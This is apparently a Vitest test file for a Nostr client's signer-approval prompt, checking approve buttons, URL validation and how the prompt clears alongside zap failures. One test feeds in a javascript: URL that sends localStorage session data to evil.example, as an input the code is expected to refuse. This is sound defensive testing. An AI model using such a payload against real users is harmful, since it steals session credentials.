import { afterEach, describe, expect, it } from 'vitest'

import { approvalSettled, askToApprove } from './signer-approval'
import { announceZapFailure, currentOutcome, dismissOutcome } from './outcome'

/** `auth_url` is the signer telling us how to unblock. */

afterEach(() => dismissOutcome())

describe('askToApprove', () => {
  it('gives the reader a button, not just a sentence', () => {
    askToApprove('https://nsec.app/key-storage?reqId=abc')
    expect(currentOutcome()?.message).toContain('approve')
    expect(currentOutcome()?.action).toEqual({
      label: 'Approve',
      href: 'https://nsec.app/key-storage?reqId=abc',
    })
  })

  it('refuses a scheme a browser should not be handed', () => {
    /* This string comes off a relay from the other party. */
    askToApprove('javascript:fetch("https://evil.example/"+localStorage.nostrich_sessions)')
    expect(currentOutcome()).toBeUndefined()
  })

  it('refuses something that is not a URL at all', () => {
    askToApprove('approve please')
    expect(currentOutcome()).toBeUndefined()
  })

  it('takes the prompt down once the signature arrives', () => {
    askToApprove('https://nsec.app/x')
    approvalSettled()
    expect(currentOutcome()).toBeUndefined()
  })

  it('does not clear a failure that landed while the reader was approving', () => {
    // A zap that failed matters more than a prompt whose moment has passed.
    askToApprove('https://nsec.app/x')
    announceZapFailure('Your wallet refused the payment.')
    approvalSettled()
    expect(currentOutcome()?.message).toBe('Your wallet refused the payment.')
  })

  it('settling twice is not a way to clear the screen', () => {
    askToApprove('https://nsec.app/x')
    approvalSettled()
    announceZapFailure('Your wallet refused the payment.')
    approvalSettled()
    expect(currentOutcome()?.message).toBe('Your wallet refused the payment.')
  })
})
